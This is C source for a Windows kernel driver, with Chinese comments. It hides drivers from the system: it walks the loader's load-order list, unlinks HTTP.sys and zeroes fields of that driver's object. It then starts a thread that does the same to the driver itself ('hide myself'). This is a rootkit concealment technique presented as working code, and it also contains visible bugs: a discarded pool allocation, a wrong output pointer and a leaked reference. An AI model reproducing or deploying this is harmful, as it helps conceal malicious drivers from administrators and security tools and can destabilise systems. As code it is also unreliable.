#include <ntifs.h>  
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;// 按加载顺序链接的链表
    LIST_ENTRY InMemoryOrderLinks;// 按内存顺序链接的链表
    LIST_ENTRY InInitializationOrderLinks;// 按初始化顺序链接的链表
    PVOID DllBase;// DLL 的基地址
    PVOID EntryPoint;// DLL 的入口点地址  
    ULONG SizeOfImage;// DLL 映像的大小
    UNICODE_STRING FullDllName;// 完整的 DLL 名称
    UNICODE_STRING BaseDllName;// DLL 的基本名称
    ULONG Flags;// 标志
    USHORT LoadCount;// 装载计数器
    USHORT TlsIndex;// TLS 索引
    union {
        LIST_ENTRY HashLinks;// 哈希链接
        struct {
            PVOID SectionPointer;// 段指针
            ULONG CheckSum;// 校验和
        };
    };
    union {
        struct {
            ULONG TimeDateStamp;// 时间戳
        };
        struct {
            PVOID LoadedImports;// 已加载的导入表
        };
    };
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

#ifdef __cplusplus
extern "C"
{
#endif
#include <NTDDK.h>

    NTKERNELAPI
        NTSTATUS
        ObReferenceObjectByName(
            IN PUNICODE_STRING ObjectName,
            IN ULONG Attributes,
            IN PACCESS_STATE PassedAccessState OPTIONAL,// 访问权限可以写0 写0完全访问不受控制FILE_ALL_ACCESS,
            IN ACCESS_MASK DesiredAccess OPTIONAL,
            IN POBJECT_TYPE ObjectType,//对象类型
            IN KPROCESSOR_MODE AccessMode,//内核模式 有三种模式 enum 类型
            IN OUT PVOID ParseContext OPTIONAL,
            OUT PVOID* Object//输出对象 我们要得到的驱动对象
        );
#ifdef __cplusplus
}
#endif

#ifdef __cplusplus
extern "C"
{
#endif
extern POBJECT_TYPE* IoDriverObjectType;
#ifdef __cplusplus
}
#endif

void DriverHide(PWCH ObjName)
{

    LARGE_INTEGER in = { 0 };
    in.QuadPart = -50000000;  // 5 秒延迟(负数相对时间,正数绝对时间)
    KeDelayExecutionThread(KernelMode, 
        FALSE, //表示线程是否可以在等待期间被中断。
        &in);


    UNICODE_STRING driverName1;
    RtlInitUnicodeString(&driverName1, ObjName);//传入驱动的名字

    PDRIVER_OBJECT Driver = (PDRIVER_OBJECT)ExAllocatePoolWithTag(NonPagedPool, sizeof(DRIVER_OBJECT), 'ziji');//初始化驱动对象

    NTSTATUS status = ObReferenceObjectByName(&driverName1, FILE_ALL_ACCESS, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&Driver);//通过驱动得到驱动的对象

    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(77, 0, "Failed to obtain driver object, status: 0x%X\n", status);
        return;
    }

    if (Driver == NULL)
    {
        DbgPrintEx(77, 0, "Driver object is NULL\n");
        return;
    }

    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)Driver->DriverSection;

    if (ldr == NULL)
    {
        DbgPrintEx(77, 0, "Driver section is NULL\n");
        ObDereferenceObject(Driver);
        return;
    }

    DbgPrintEx(77, 0, "Driver name: %wZ\n", &ldr->FullDllName);//输出名字

    // Remove driver from linked list
    RemoveEntryList(&ldr->InLoadOrderLinks);

    Driver->DriverInit = NULL;
    Driver->DriverSection = NULL;
    Driver->Type = 0;

    ObDereferenceObject(Driver);//用于减少对象的引用计数。
}

VOID UnloadDriver(PDRIVER_OBJECT Pdriver) {
	DbgPrintEx(77, 0, "卸载成功\n");
}
extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) {

	pDriver->DriverUnload = UnloadDriver;
	
    PLDR_DATA_TABLE_ENTRY ldr = (PLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
    PLDR_DATA_TABLE_ENTRY pre = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderLinks.Flink;//本身的节点
    PLDR_DATA_TABLE_ENTRY next = (PLDR_DATA_TABLE_ENTRY)pre->InLoadOrderLinks.Flink;//下一个驱动的节点
  
    UNICODE_STRING driverName = { 0 };
    RtlInitUnicodeString(&driverName, L"HTTP.sys");//获取名字

    UNICODE_STRING driverName1 = { 0 };
    RtlInitUnicodeString(&driverName1, L"\\driver\\HTTP");
	
    while (next != pre)//遍历一遍
    {

        if (next->BaseDllName.Length != 0 && RtlCompareUnicodeString(&driverName, &next->BaseDllName, TRUE) == 0)//判断这个是不是空的，然后名字是否对的上
        {

            PDRIVER_OBJECT Driver = (PDRIVER_OBJECT)ExAllocatePoolWithTag(NonPagedPool, sizeof(DRIVER_OBJECT), 'MyTa');
            NTSTATUS status = ObReferenceObjectByName(&driverName1, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)Driver);//通过驱动得到驱动的对象

            if (NT_SUCCESS(status))
            {
                RemoveEntryList(&next->InLoadOrderLinks);
                Driver->DriverInit = NULL;
                Driver->DriverSection = NULL;//从双链表中去除，同时把一些其他的东西也都置0
                Driver->Type = 0;
            }
            DbgPrintEx(77, 0, "[db]:driver name = %wZ\r\n", &next->FullDllName);

            break;
        }

        next = (PLDR_DATA_TABLE_ENTRY)next->InLoadOrderLinks.Flink;//遍历下一个(永远与第一个pre做对比)
    }


    //隐藏自己
    HANDLE hThread = NULL;
    NTSTATUS status = PsCreateSystemThread(&hThread,THREAD_ALL_ACCESS,NULL,NULL,NULL, (PKSTART_ROUTINE)DriverHide,L"\\driver\\15断链摘除驱动节点");
	return 0;
}